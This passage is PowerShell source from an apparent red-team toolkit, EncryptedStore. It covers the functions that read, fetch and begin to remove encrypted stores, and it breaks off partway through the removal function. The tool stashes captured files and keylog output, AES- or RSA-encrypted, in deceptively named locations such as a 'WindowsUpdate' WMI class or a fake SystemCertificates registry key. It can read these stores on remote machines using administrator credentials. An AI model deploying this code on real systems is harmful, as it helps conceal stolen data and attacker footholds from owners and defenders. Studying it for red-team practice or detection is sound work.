                    $EncDataBytes = Out-StoreEncryptedByte -FullPathBytes $FullPathBytes -DataBytes $DataBytes -EncryptionKey $EncryptionKey -EncryptionType $EncryptionType

                    if($Base64Encode) {
                        $AllEncryptedBytes += $EncDataBytes
                    }
                    else {
                        $EncDataBytes
                    }
                }
                catch {
                    Write-Error "Error in resolving input path and reading file: $_"
                }
            }
            else {
                # if the passed data isn't a file (i.e. keylog data) use a timestamped/tagged file for later extraction
                $FullPath = "data\$($DataTag)$(Get-Date -format M.d.yyyy_H.m.s).txt".PadRight(260)
                $FullPathBytes = $Encoding.GetBytes($FullPath)

                [Byte[]]$DataBytes = $Encoding.GetBytes($InputData)

                $EncDataBytes = Out-StoreEncryptedByte -FullPathBytes $FullPathBytes -DataBytes $DataBytes -EncryptionKey $EncryptionKey -EncryptionType $EncryptionType

                if($Base64Encode) {
                    $AllEncryptedBytes += $EncDataBytes
                }
                else {
                    $EncDataBytes
                }
            }
        }
    }

    END {
        if($AllEncryptedBytes) {
            [System.Convert]::ToBase64String($AllEncryptedBytes)
        }
    }
}


function Read-EncryptedStore {
<#
    .SYNOPSIS

        Reads an EncryptedStore from a file on disk, registry location, or custom WMI class,
        and lists (-List) or decrypts the a -OutputPath folder (default of .\output\).

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Takes a given encrypted store specified by $StorePath and extracts,
        decrypts, and decompresses all files/data contained within it. Extracted
        files are written out to a created nested folder structure mirroring
        the file's original path.

        Store structure:

            [4 bytes representing size of next block to decrypt]
            [0] (indicating straight AES)
            [16 byte IV]
            [AES-CBC encrypted file block]
                [compressed stream]
                    [260 characters/bytes indicating original path]
                    [file contents]
            ...

            [4 bytes representing size of next block to decrypt]
            [1] (indicating RSA+AES)
            [128 bytes random AES key encrypted with the the RSA public key]
            [16 byte IV]
            [AES-CBC encrypted file block]
                [compressed stream]
                    [260 characters/bytes indicating original path]
                    [file contents]
            ...

        To decrypt ENCSTORE.bin:

            While there is more data to decrypt:

                -Read first 4 Bytes of ENCSTORE.bin and calculate length value X
                -Read next size X Bytes of encrypted file
                -Read first byte of encrypted block to determine encryption scheme
                    - 0 == straight AES
                    - 1 == RSA + AES where random AES key encrypted with RSA pub key
                -If RSA+AES is used, read the next 128 bytes of the RSA encrypted AES key and decrypt using the RSA private key
                -Read next 16 Bytes of encrypted block and extract IV
                -Read remaining block and decrypt AES-CBC compressed stream using key and extracted IV
                -Decompress [PATH + file] using IO.Compression.DeflateStream
                -Split path by \ and create nested folder structure to mirror original path
                -Write original file to mirrored path

    .PARAMETER StorePath

        The path of the encrypted store to read file data from. Can be on the filesystem ("${Env:Temp}\debug.bin"),
        registry (HKLM:\SOFTWARE\something\something\key\valuename), or WMI (ROOT\Software\namespace:ClassName).

    .PARAMETER Key

        The key used to encrypt data for the store. A 32 character string is interpretered as an AES key,
        a string of the form
        ^<RSAKeyValue><Modulus>.*</Modulus><Exponent>.*</Exponent><P>.*</P><Q>.*</Q><DP>.*</DP><DQ>.*</DQ><InverseQ>.*</InverseQ><D>.*</D></RSAKeyValue>$
        is interpreted as an RSA public key, and anything else is fed into a MD5 hash function to produce a
        32 character password for AES encryption.

    .PARAMETER SecureKey

        A [System.Security.SecureString] used for the encryption key, following the same parsing logic from
        the key parameter description above.

    .PARAMETER OutputPath

        The folder to output any decrypted data to, defaults to .\output\

    .PARAMETER List

        List filenames and file sizes of the encrypted store.

    .PARAMETER ComputerName

        Access the -StorePath on the specified computers. The default is the local computer.

        Type the NetBIOS name, an IP address, or a fully qualified domain
        name of one or more computers. To specify the local computer, type
        the computer name, a dot (.), or "localhost".

        This parameter does not rely on Windows PowerShell remoting. You can
        use the ComputerName parameter even if your computer is not
        configured to run remote commands.

    .PARAMETER Credential

        Specifies a user account that has permission to perform this action.

        The default is the current user. Type a user name, such as "User01",
        "Domain01\User01", or User@Contoso.com. Or, enter a PSCredential
        object, such as an object that is returned by the Get-Credential
        cmdlet. When you type a user name, you will be prompted for a
        password.

    .PARAMETER Impersonation

        Specifies the impersonation level to use. Valid values are:

            0: Default (Reads the local registry for the default impersonation level, which is usually set to "3: Impersonate".)
            1: Anonymous (Hides the credentials of the caller.)
            2: Identify (Allows objects to query the credentials of the caller.)
            3: Impersonate (Allows objects to use the credentials of the caller.)
            4: Delegate (Allows objects to permit other objects to use the credentials of the caller.)

    .PARAMETER Authentication

        Specifies the authentication level to be used with the WMI connection. Valid values are:

            -1: Unchanged
            0:  Default
            1:  None (No authentication in performed.)
            2:  Connect (Authentication is performed only when the client establishes a relationship with the application.)
            3:  Call (Authentication is performed only at the beginning of each call when the application receives the request.)
            4:  Packet (Authentication is performed on all the data that is received from the client.)
            5:  PacketIntegrity (All the data that is transferred between the client  and the application is authenticated and verified.)
            6:  PacketPrivacy (The properties of the other authentication levels are used, and all the data is encrypted.)

    .PARAMETER EnableAllPrivileges

        Enables all the privileges of the current user before the command
        makes the WMI call.

    .PARAMETER Authority

        Specifies the authority to use to authenticate the WMI connection.
        You can specify standard NTLM or Kerberos authentication. To use
        NTLM, set the authority setting to ntlmdomain:<DomainName>, where
        <DomainName> identifies a valid NTLM domain name. To use Kerberos,
        specify kerberos:<DomainName\ServerName>. You cannot include the
        authority setting when you connect to the local computer.

    .EXAMPLE

        PS C:\> Read-EncryptedStore -StorePath C:\Temp\debug.bin -Key 'Password123!'
        File data written to C:\Temp\C\Temp\secret.txt
        File data written to C:\Temp\C\Temp\secret2.txt
        File data written to C:\Temp\data\keylog_3.24.2016_11.9.36

        Extracts, decrypts, and decompresses all files stored within the C:\Temp\debug.bin
        encrypted store, writing the files out to a mirrored folder structure of
        their orignal paths.

    .EXAMPLE

        PS C:\> $Key = New-RSAKeyPair
        PS C:\> $StorePath = "HKLM:\SOFTWARE\Microsoft\SystemCertificates\DomainCertificate"
        PS C:\> ".\secret.txt" | Write-EncryptedStore -StorePath $StorePath -Key $Key.Pub
        PS C:\> Read-EncryptedStore -StorePath $StorePath -Key $Key.Priv -List

        Generates a new RSA public/private key pair with New-RSAKeyPair, uses the public
        key to encrypt a file from disk, and stores the result in the specified registry location.
        The call to Read-EncryptedStore extracts the stored data using the private key and
        displays the files in the container.

    .EXAMPLE

        PS C:\> $StorePath = "ROOT\Software:WindowsUpdate"
        PS C:\> $SecurePassword = 'Password12345' | ConvertTo-SecureString -AsPlainText -Force
        PS C:\> ".\secret.txt" | Write-EncryptedStore -StorePath $StorePath -SecureKey $SecurePassword -Verbose
        VERBOSE: EncryptionKey not 32 Bytes, using MD5 of key specified as the AESencryption key.
        VERBOSE: RawDataStore length: 613
        VERBOSE: Creating namespace 'ROOT\Software'
        VERBOSE: Creating class 'WindowsUpdate' in namespace 'ROOT\Software'
        VERBOSE: Setting 'Content' value of ROOT\Software:WindowsUpdate
        PS C:\Users\harmj0y\Desktop> Read-EncryptedStore -StorePath $StorePath -SecureKey $SecurePassword -List

        Path                                                                   FileSize
        ----                                                                   --------
        C:\Users\harmj0y\Desktop\secret.txt                                         446


        Stores a password in a secure string, and uses this to encrypt the specified document. The store is
        then written to a custom WMI class, which is first created as it doesn't exist. The same secured string
        is then used to read the data from the store.
    
    .EXAMPLE

        PS C:\> $ComputerName = 'PRIMARY.testlab.local'
        PS C:\> $Credential = Get-Credential 'TESTLAB\administrator'
        PS C:\> $StorePath = 'HKLM:\SOFTWARE\Microsoft\SystemCertificates\DomainCert'
        PS C:\> ".\secret.txt" | Write-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key 'Password123!'
        PS C:\> Read-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key 'Password123!' -List

        Take the local "secret.txt" file, compress/encrypt it, store it in the specified registry
        key on the remote system using the specified credentials, then read the encrypted store and list
        the files within in.
#>

    [CmdletBinding(DefaultParameterSetName = 'Key')]
    param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [ValidatePattern('.*\\.*')]
        [String[]]
        $StorePath,

        [Parameter(Position = 1, Mandatory = $True, ParameterSetName = 'Key')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Key,

        [Parameter(Position = 1, Mandatory = $True, ParameterSetName = 'SecureKey')]
        [ValidateNotNullOrEmpty()]
        [System.Security.SecureString]
        $SecureKey,

        [Parameter(Position = 2)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $OutputPath = '.\output\',

        [Parameter(Position = 3)]
        [Switch]
        $List,

        [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Cn')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.ImpersonationLevel]
        $Impersonation,

        [System.Management.AuthenticationLevel]
        $Authentication,

        [Switch]
        $EnableAllPrivileges,

        [String]
        $Authority
    )

    BEGIN {
        $Encoding = [System.Text.Encoding]::ASCII
        $WmiMethodArgs = @{}

        if ($PSBoundParameters['SecureKey']) {
            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureKey)
            $EncryptionKey = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        }
        else {
            $EncryptionKey = $Key
        }
        Write-Verbose "EncryptionKey: $EncryptionKey"

        if($EncryptionKey -match '^<RSAKeyValue><Modulus>.*</Modulus><Exponent>.*</Exponent><P>.*</P><Q>.*</Q><DP>.*</DP><DQ>.*</DQ><InverseQ>.*</InverseQ><D>.*</D></RSAKeyValue>$') {
            Write-Verbose "Using RSA private key for decryption."
            $EncryptionType = 'RSA'
        }
        elseif($EncryptionKey.Length -eq 32) {
            Write-Verbose "Using 32 byte AES key for decryption."
            $EncryptionType = 'AES'
        }
        else {
            Write-Verbose "EncryptionKey not 32 Bytes, using MD5 of key specified as the AES decryption key."

            # transform the encryption key to a MD5 hash if the key is not 32 Bytes
            $StringBuilder = New-Object System.Text.StringBuilder
            [System.Security.Cryptography.HashAlgorithm]::Create('MD5').ComputeHash($Encoding.GetBytes($EncryptionKey)) | ForEach-Object { [Void]$StringBuilder.Append($_.ToString("x2")) }
            $EncryptionKey = $StringBuilder.ToString()
            $EncryptionType = 'AES'
        }

        # If additional WMI cmdlet properties were provided, proxy them to Invoke-WmiMethod
        if ($PSBoundParameters['Credential']) { $WmiMethodArgs['Credential'] = $Credential }
        if ($PSBoundParameters['Impersonation']) { $WmiMethodArgs['Impersonation'] = $Impersonation }
        if ($PSBoundParameters['Authentication']) { $WmiMethodArgs['Authentication'] = $Authentication }
        if ($PSBoundParameters['EnableAllPrivileges']) { $WmiMethodArgs['EnableAllPrivileges'] = $EnableAllPrivileges }
        if ($PSBoundParameters['Authority']) { $WmiMethodArgs['Authority'] = $Authority }
    }

    PROCESS {

        ForEach($Computer in $ComputerName) {

            ForEach($Store in $StorePath) {

                $WmiMethodArgs['ComputerName'] = $Computer

                # retrieve the data for the specified encrypted store
                $EncryptedStoreObject = Get-EncryptedStoreData -StorePath $Store @WmiMethodArgs

                $EncStoreData = $EncryptedStoreObject.EncStoreData
                $EncStoreLength = $EncryptedStoreObject.EncStoreLength
                $Offset = 0

                # iterate over the encrypted store data, extracting all blocks
                While($Offset -lt $EncStoreLength) {
                    try {
                        # first extract out the block length
                        $BlockLengthBytes = New-Object Byte[] 4
                        $BlockLengthBytes = $EncStoreData[$Offset..($Offset + 3)]
                        $BlockLength = [BitConverter]::ToInt32($BlockLengthBytes, 0)

                        # read in the 1 byte indicating encryption type
                        $BlockEncryptionType = New-Object Byte[] 1
                        $BlockEncryptionType = $EncStoreData[$Offset + 4]

                        # read in the bytes for the next block
                        $BlockBytes = New-Object Byte[] $BlockLength
                        $BlockBytes = $EncStoreData[($Offset + 5)..($Offset + 4 + $BlockLength)]

                        if ($BlockLength) {
                            $Offset += ($BlockLength + 5)

                            if(($EncryptionType -eq 'AES') -and ($BlockEncryptionType -ne 0)) {
                                Write-Warning "[$Computer] Block at offset $Offset uses RSA encryption but AES key supplied, skipping."
                                continue
                            }
                            elseif(($EncryptionType -eq 'RSA') -and ($BlockEncryptionType -ne 1)) {
                                Write-Warning "[$Computer] Block at offset $Offset uses AES encryption but RSA key supplied, skipping."
                                continue
                            }

                            $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                            $AES.Mode = 'CBC'

                            if($BlockEncryptionType -eq 1) {

                                # random AES key encrypted with RSA pair
                                $CSP = New-Object System.Security.Cryptography.CspParameters
                                $CSP.Flags = $CSP.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore
                                $RSA = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList @(1024,$CSP)

                                $RSA.FromXmlString($EncryptionKey)

                                # use private key to decrypt the randomized AES key encrypted using the RSA public key
                                $AESKeyBytes = $RSA.Decrypt($BlockBytes[0..127] , $False)
                                $AES.Key = $AESKeyBytes
                                $AES.IV = $BlockBytes[128..143]
                                $BlockOffset = 144
                            }
                            else {
                                # straight AES
                                $AES.Key = $Encoding.GetBytes($EncryptionKey)
                                $AES.IV = $BlockBytes[0..15]
                                $BlockOffset = 16
                            }

                            # decrypt the next chunk
                            $DecBytes = $AES.CreateDecryptor().TransformFinalBlock($BlockBytes[$BlockOffset..$BlockBytes.Length],0,$BlockBytes.Length-$BlockOffset)

                            # decompress PATH/tag + file
                            $MemoryStream = New-Object System.IO.MemoryStream
                            $MemoryStream.Write($DecBytes, 0, $DecBytes.Length)
                            $Null = $MemoryStream.Seek(0,0)

                            $CompressionStream = New-Object System.IO.Compression.DeflateStream($MemoryStream, [System.IO.Compression.CompressionMode]::Decompress)
                            $StreamReader = New-Object System.IO.StreamReader($CompressionStream)
                            $ChunkRaw = $StreamReader.ReadToEnd()

                            $Path = $Encoding.GetString($ChunkRaw[0..259]).trim()
                            $FileData = $ChunkRaw[260..$($ChunkRaw.Length)]

                            if($PSBoundParameters['List']) {
                                # if we're just listing contents
                                $Properties = @{
                                    'Path' = $Path
                                    'FileSize' = $FileData.Length
                                }
                                New-Object -TypeName PSObject -Property $Properties
                            }
                            else {
                                # recursively create the captured path
                                $Path = $Path.Replace(':', '_')
                                $Path = $Path.TrimStart('\')
                                $Parts = $Path.Split('\')

                                if($Parts.Length -gt 1) {
                                    $DirectoryPath = "$OutputPath\$($Parts[0..$($Parts.Length-2)] -join '\')"

                                    $FileName = $Parts[-1]

                                    $Null = New-Item -ItemType Directory -Path "$DirectoryPath" -Force -ErrorAction SilentlyContinue

                                    $DirectoryPath = Resolve-Path -Path $DirectoryPath

                                    # if the file name already exists, iterate a counter until we have a unique name
                                    if(Test-Path -Path "$DirectoryPath\$FileName") {
                                        $Counter = 1

                                        $NewFileName = [System.IO.Path]::GetFileNameWithoutExtension($FileName)
                                        $FileExt = [System.IO.Path]::GetExtension($FileName)

                                        While (Test-Path -Path "$DirectoryPath\$($NewFileName + ' ' + $Counter + $FileExt)") {
                                            $Counter += 1
                                        }

                                        $FileName = $NewFileName + ' ' + $Counter + $FileExt
                                    }
                                    [System.IO.File]::WriteAllBytes("$DirectoryPath\$FileName", $FileData)
                                    Write-Output "File data written to $DirectoryPath\$FileName"
                                }
                                else {
                                    # if the file name already exists, iterate a counter until we have a unique name
                                    if(Test-Path -Path $Path) {
                                        $Counter = 1

                                        $NewFileName = [System.IO.Path]::GetFileNameWithoutExtension($Path)
                                        $FileExt = [System.IO.Path]::GetExtension($Path)

                                        While (Test-Path -Path "$($NewFileName + ' ' + $Counter + $FileExt)") {
                                            $Counter += 1
                                        }

                                        $Path = $NewFileName + ' ' + $Counter + $FileExt
                                    }

                                    # if the output is timestamped/tagged
                                    [System.IO.File]::WriteAllBytes($Path, $FileData)
                                    Write-Output "File data written to $Path"
                                }
                            }
                        }
                    }
                    catch {
                        Write-Error "Error in decryption : $_"
                    }
                }
            }
        }
    }
}


function Get-EncryptedStoreData {
<#
    .SYNOPSIS

        Helper that extracts the data from an encrypted store and outputs a custom
        object to the pipeline.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .PARAMETER StorePath

        The path of the encrypted store to read file data from. Can be on the filesystem ("${Env:Temp}\debug.bin"),
        registry (HKLM:\SOFTWARE\something\something\key\valuename), or WMI (ROOT\Software\namespace:ClassName).

    .PARAMETER ComputerName

        Access the -StorePath on the specified computers. The default is the local computer.

        Type the NetBIOS name, an IP address, or a fully qualified domain
        name of one or more computers. To specify the local computer, type
        the computer name, a dot (.), or "localhost".

        This parameter does not rely on Windows PowerShell remoting. You can
        use the ComputerName parameter even if your computer is not
        configured to run remote commands.

    .PARAMETER Credential

        Specifies a user account that has permission to perform this action.

        The default is the current user. Type a user name, such as "User01",
        "Domain01\User01", or User@Contoso.com. Or, enter a PSCredential
        object, such as an object that is returned by the Get-Credential
        cmdlet. When you type a user name, you will be prompted for a
        password.

    .PARAMETER Impersonation

        Specifies the impersonation level to use. Valid values are:

            0: Default (Reads the local registry for the default impersonation level, which is usually set to "3: Impersonate".)
            1: Anonymous (Hides the credentials of the caller.)
            2: Identify (Allows objects to query the credentials of the caller.)
            3: Impersonate (Allows objects to use the credentials of the caller.)
            4: Delegate (Allows objects to permit other objects to use the credentials of the caller.)

    .PARAMETER Authentication

        Specifies the authentication level to be used with the WMI connection. Valid values are:

            -1: Unchanged
            0:  Default
            1:  None (No authentication in performed.)
            2:  Connect (Authentication is performed only when the client establishes a relationship with the application.)
            3:  Call (Authentication is performed only at the beginning of each call when the application receives the request.)
            4:  Packet (Authentication is performed on all the data that is received from the client.)
            5:  PacketIntegrity (All the data that is transferred between the client  and the application is authenticated and verified.)
            6:  PacketPrivacy (The properties of the other authentication levels are used, and all the data is encrypted.)

    .PARAMETER EnableAllPrivileges

        Enables all the privileges of the current user before the command
        makes the WMI call.

    .PARAMETER Authority

        Specifies the authority to use to authenticate the WMI connection.
        You can specify standard NTLM or Kerberos authentication. To use
        NTLM, set the authority setting to ntlmdomain:<DomainName>, where
        <DomainName> identifies a valid NTLM domain name. To use Kerberos,
        specify kerberos:<DomainName\ServerName>. You cannot include the
        authority setting when you connect to the local computer.

    .EXAMPLE

        PS C:\> $StorePath = "ROOT\Software:WindowsUpdate"
        PS C:\> Get-EncryptedStoreData -StorePath $StorePath

        Retrieve the raw encrypted store data in the WMI class specified from the localhost.
    
    .EXAMPLE

        PS C:\> $ComputerName = 'PRIMARY.testlab.local'
        PS C:\> $Credential = Get-Credential 'TESTLAB\administrator'
        PS C:\> $StorePath = 'HKLM:\SOFTWARE\Microsoft\SystemCertificates\DomainCert'
        PS C:\> Get-EncryptedStoreData -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath

        Retrive the raw encrypted store data in the registry key specified on the remote
        'PRIMARY.testlab.local' machine using the specified credentials. 
#>

    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [ValidatePattern('.*\\.*')]
        [String[]]
        $StorePath,

        [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Cn')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.ImpersonationLevel]
        $Impersonation,

        [System.Management.AuthenticationLevel]
        $Authentication,

        [Switch]
        $EnableAllPrivileges,

        [String]
        $Authority
    )

    BEGIN {
        # If additional WMI cmdlet properties were provided, proxy them to Invoke-WmiMethod
        $WmiMethodArgs = @{}
        if ($PSBoundParameters['Credential']) { $WmiMethodArgs['Credential'] = $Credential }
        if ($PSBoundParameters['Impersonation']) { $WmiMethodArgs['Impersonation'] = $Impersonation }
        if ($PSBoundParameters['Authentication']) { $WmiMethodArgs['Authentication'] = $Authentication }
        if ($PSBoundParameters['EnableAllPrivileges']) { $WmiMethodArgs['EnableAllPrivileges'] = $EnableAllPrivileges }
        if ($PSBoundParameters['Authority']) { $WmiMethodArgs['Authority'] = $Authority }
    }

    PROCESS {
        ForEach($Computer in $ComputerName) {

            if($Computer.ComputerName) {
                $Computer = $Computer.ComputerName
            }

            ForEach($Store in $StorePath) {

                Write-Verbose "[$Computer] Reading encrypted store at: '$Store'"

                if(($Store -match '^[A-Z]:\\') -or ($Store -match '^\\\\[A-Z0-9]+\\[A-Z0-9]+')) {
                    # file on a disk, local or remote, or \\UNC path

                    if($Computer -ne 'localhost') {
                        # remote -ComputerName specification
                        $Net = New-Object -ComObject WScript.Network

                        $PathParts = $Store.Replace(':', '$').Split('\')
                        $UNCPath = "\\$ComputerName\$($PathParts[0..($PathParts.Length-2)] -join '\')"
                        $FileName = $PathParts[-1]

                        if($PSBoundParameters['Credential']) {
                            try {
                                # map a temporary network drive with the credentials supplied
                                # this is because New-PSDrive in PowerShell v2 doesn't support alternate credentials :(
                                Write-Verbose "[$Computer] Mapping drive Z: to '$UNCPath'"
                                $Net.MapNetworkDrive("Z:", $UNCPath, $False, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                                $EncStorePath = "Z:\$FileName"
                            }
                            catch {
                                throw "[$Computer] Error mapping path '$Store' : $_"
                            }
                        }
                        else {
                            $EncStorePath = "$UNCPath\$FileName"
                        }
                    }
                    else {
                        # plain old localhost
                        $EncStorePath = Resolve-Path -Path $Store
                    }

                    try {
                        $EncStoreData = Get-Content -Encoding Byte -Path $EncStorePath -ErrorAction Stop
                        $EncStoreLength = $EncStoreData.Length
                    }
                    catch {
                        Write-Warning "[$Computer] Error reading from '$EncStorePath' : $_"
                    }

                    if($Computer -ne 'localhost' -and ($PSBoundParameters['Credential'])) {
                        try {
                            Write-Verbose "[$Computer] Unmapping drive Z:\"
                            $Net = New-Object -ComObject WScript.Network
                            $Null = $Net.RemoveNetworkDrive('Z:', $True)
                        }
                        catch {
                            Write-Verbose "[$Computer] Error unmapping drive Z:\ : $_"
                        }
                    }
                }
                elseif($Store -match '^(HKCR|HKCU|HKLM|HKU|HKCC):\\') {
                    # registry storage

                    $RegistryParts = $Store.Split('\')
                    $KeyName = ($RegistryParts[0..($RegistryParts.Length - 2)]) -join '\'
                    $ValueName = $RegistryParts[-1]

                    if($Computer -ne 'localhost') {
                        # remote registry storage - logic heavily adopted from @mattifestation's Invoke-WmiCommand.ps1 logic

                        $WmiMethodArgs['ComputerName'] = $Computer

                        $RegistryKeyParts = $KeyName.Split('\')
                        $RegistryKeyPath = $RegistryKeyParts[1..($RegistryKeyParts.Length)] -join '\'

                        switch ($RegistryKeyParts[0]) {
                            'HKLM:' { $Hive = 2147483650 }
                            'HKCU:' { $Hive = 2147483649 }
                            'HKCR:' { $Hive = 2147483648 }
                            'HKU:' { $Hive = 2147483651 }
                            'HKCC:' { $Hive = 2147483653 }
                        }

                        $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'GetBinaryValue' -ArgumentList @($Hive, $RegistryKeyPath, $ValueName)

                        if ($Result.ReturnValue -ne 0) {
                            Write-Warning "[$Computer] Unable retrieve encrypted store data from the following registry value: $Store"
                            $EncStoreLength = 0
                        }
                        else {
                            $EncStoreData = $Result.uValue
                            $EncStoreLength = $EncStoreData.Length
                        }
                    }
                    else {
                        # localhost registry storage
                        try {
                            $EncStoreData = (Get-ItemProperty -Path $KeyName -Name $ValueName -ErrorAction Stop).$ValueName
                            $EncStoreLength = $EncStoreData.Length
                        }
                        catch {
                            Write-Warning "[$Computer] Exception reading registry location '$Store' : $_"
                        }
                    }
                }
                elseif($Store -match '^[A-Z0-9]*\\.*:[A-Z0-9]+$') {
                    # WMI storage

                    try {
                        if($Computer -ne 'localhost') {
                            $StoreParts = $Store.Split(':')
                            $Namespace = $StoreParts[0]
                            $Class = $StoreParts[1]

                            $WmiMethodArgs['ComputerName'] = $Computer

                            $WmiClass = Get-WmiObject @WmiMethodArgs -Namespace $Namespace -List -ErrorAction Stop | Where-Object {$_.Name -eq $Class}
                        }
                        else {
                            $WmiClass = [WmiClass] $Store
                        }

                        if($WmiClass) {
                            $EncStoreData = $WmiClass.GetPropertyValue('Content')
                            $EncStoreLength = $EncStoreData.Length
                        }
                        else {
                            Write-Verbose "[$Computer] Error reading from WMI location '$Store' : no WMI class returned"
                        }
                    }
                    catch {
                        Write-Warning "[$Computer] Exception reading WMI location '$Store' : $_"
                    }
                }
                else {
                    throw "[$Computer] Invalid StorePath format: $Store"
                }

                if($EncStoreData -and $EncStoreLength) {
                    $Properties = @{
                        'ComputerName' = $Computer
                        'StorePath' = $Store
                        'EncStoreData' = $EncStoreData
                        'EncStoreLength' = $EncStoreLength
                    }

                    $EncryptedStoreObject = New-Object -TypeName PSObject -Property $Properties
                    $EncryptedStoreObject.PSObject.TypeNames.Insert(0, 'EncryptedStore')
                    $EncryptedStoreObject
                }
            }
        }
    }
}


function Remove-EncryptedStore {
<#
    .SYNOPSIS

        Removes the specified encrypted store data. For files on disk, the file is
        deleted, for registry entries the key is removed, and for custom WMI classes
        the custom class (but not the namespace) is removed.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .PARAMETER StorePath

        The path of the encrypted store to read file data from. Can be on the filesystem ("${Env:Temp}\debug.bin"),
        registry (HKLM:\SOFTWARE\something\something\key\valuename), or WMI (ROOT\Software\namespace:ClassName).

    .PARAMETER ComputerName

        Access the -StorePath on the specified computers. The default is the local computer.

        Type the NetBIOS name, an IP address, or a fully qualified domain
        name of one or more computers. To specify the local computer, type
        the computer name, a dot (.), or "localhost".

        This parameter does not rely on Windows PowerShell remoting. You can
        use the ComputerName parameter even if your computer is not
        configured to run remote commands.

    .PARAMETER Credential

        Specifies a user account that has permission to perform this action.

        The default is the current user. Type a user name, such as "User01",
        "Domain01\User01", or User@Contoso.com. Or, enter a PSCredential
        object, such as an object that is returned by the Get-Credential
        cmdlet. When you type a user name, you will be prompted for a
        password.

    .PARAMETER Impersonation

        Specifies the impersonation level to use. Valid values are:

            0: Default (Reads the local registry for the default impersonation level, which is usually set to "3: Impersonate".)
            1: Anonymous (Hides the credentials of the caller.)
            2: Identify (Allows objects to query the credentials of the caller.)
            3: Impersonate (Allows objects to use the credentials of the caller.)
            4: Delegate (Allows objects to permit other objects to use the credentials of the caller.)

    .PARAMETER Authentication

        Specifies the authentication level to be used with the WMI connection. Valid values are:

            -1: Unchanged
            0:  Default
            1:  None (No authentication in performed.)
            2:  Connect (Authentication is performed only when the client establishes a relationship with the application.)
            3:  Call (Authentication is performed only at the beginning of each call when the application receives the request.)
            4:  Packet (Authentication is performed on all the data that is received from the client.)
            5:  PacketIntegrity (All the data that is transferred between the client  and the application is authenticated and verified.)
            6:  PacketPrivacy (The properties of the other authentication levels are used, and all the data is encrypted.)

    .PARAMETER EnableAllPrivileges

        Enables all the privileges of the current user before the command
        makes the WMI call.

    .PARAMETER Authority

        Specifies the authority to use to authenticate the WMI connection.
        You can specify standard NTLM or Kerberos authentication. To use
        NTLM, set the authority setting to ntlmdomain:<DomainName>, where
        <DomainName> identifies a valid NTLM domain name. To use Kerberos,
        specify kerberos:<DomainName\ServerName>. You cannot include the
        authority setting when you connect to the local computer.
    
    .EXAMPLE
        
        PS C:\> Remove-EncryptedStore -StorePath 'HKLM:\SOFTWARE\Microsoft\SystemCertificates\DomainCert'

        Remove the encrypted store in the specified specified registry key on the local machine. 

    .EXAMPLE
        
        PS C:\> $StorePath = 'ROOT\Software:WindowsUpdate'
        PS C:\> Get-EncryptedStoreData -StorePath $StorePath | Remove-EncryptedStore

        Remove the encrypted store in the specified specified WMI class on the local machine.

    .EXAMPLE

        PS C:\> $ComputerName = 'PRIMARY.testlab.local'
        PS C:\> $Credential = Get-Credential 'TESTLAB\administrator'
        PS C:\> $StorePath = 'HKLM:\SOFTWARE\Microsoft\SystemCertificates\DomainCert'
        PS C:\> Get-EncryptedStoreData -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath | Remove-EncryptedStore -ComputerName $ComputerName -Credential $Credential

        Retrive the raw encrypted store data in the registry key specified on the remote
        'PRIMARY.testlab.local' machine using the specified credentials, and then remove
        the store. 
#>

    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [ValidatePattern('.*\\.*')]
        [String[]]
        $StorePath,

        [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Cn')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.ImpersonationLevel]
        $Impersonation,

        [System.Management.AuthenticationLevel]
        $Authentication,

        [Switch]
        $EnableAllPrivileges,

        [String]
        $Authority
    )

    BEGIN {
        # If additional WMI cmdlet properties were provided, proxy them to Invoke-WmiMethod
        $WmiMethodArgs = @{}
        if ($PSBoundParameters['Credential']) { $WmiMethodArgs['Credential'] = $Credential }
        if ($PSBoundParameters['Impersonation']) { $WmiMethodArgs['Impersonation'] = $Impersonation }
        if ($PSBoundParameters['Authentication']) { $WmiMethodArgs['Authentication'] = $Authentication }
        if ($PSBoundParameters['EnableAllPrivileges']) { $WmiMethodArgs['EnableAllPrivileges'] = $EnableAllPrivileges }
        if ($PSBoundParameters['Authority']) { $WmiMethodArgs['Authority'] = $Authority }
    }

    PROCESS {
        ForEach($Computer in $ComputerName) {

            ForEach($Store in $StorePath) {

                Write-Verbose "[$Computer] Removing encrypted store at: '$Store'"

